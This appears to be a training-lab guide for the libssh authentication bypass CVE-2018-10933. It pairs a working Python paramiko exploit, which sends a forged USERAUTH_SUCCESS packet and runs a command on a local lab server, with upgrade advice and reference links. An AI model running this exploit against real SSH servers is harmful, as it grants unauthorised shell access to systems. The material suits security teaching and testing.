# libssh Server Authentication Bypass (CVE-2018-10933)

## Overview

libssh is a multiplatform C library implementing the SSHv2 and SSHv1 protocol on client and server sides. Vulnerability CVE-2018-10933 allows remote attackers to bypass server-side authentication without supplying credentials. When a client sends an unexpected SSH2_MSG_USERAUTH_SUCCESS packet instead of an authentication request packet, the server state machine unconditionally transitions to an authenticated state, granting shell access.

- **Service Access**: `http://localhost:8142/`
- **Default Credentials**: `Unauthenticated bypass`
- **Docker Shortcut**: `./lab start libssh-auth-bypass`
- **Container Name**: `cyberlab_04_libssh_auth_bypass`
- **RAM Footprint**: ~100M

---

## Exploitation Walkthrough

### 1. Check SSH Service Banner

```bash
nc -vn 127.0.0.1 8142
```

### 2. Send SSH2_MSG_USERAUTH_SUCCESS Packet via Python paramiko/socket

```bash
python3 -c "
import socket, paramiko

s = socket.socket()
s.connect(('127.0.0.1', 8142))
t = paramiko.Transport(s)
t.start_client()
msg = paramiko.Message()
msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(msg)
cmd_channel = t.open_session()
cmd_channel.exec_command('id')
out = cmd_channel.makefile('rb', -1).read()
print(out.decode())
"
```

### 3. Verify Output

```bash
# Output demonstrates command execution with process credentials.
```

---

## Defensive Remediation & Hardening

1. Upgrade libssh to version 0.8.4 or 0.7.6 or newer.
2. Verify all embedded applications linking against libssh are recompiled with updated libraries.

---

## Video Walkthroughs & Technical References

- [Full Ethical Hacking Course - Beginner Network Penetration Testing (2019)](https://www.youtube.com/watch?v=WnN6dbos5u8)
- [libssh CVE-2018-10933 Security Advisory](https://www.libssh.org/security/advisories/CVE-2018-10933.txt)
- [Vulhub libssh Bypass Environment](https://vulhub.org/#/environments/libssh/CVE-2018-10933/)
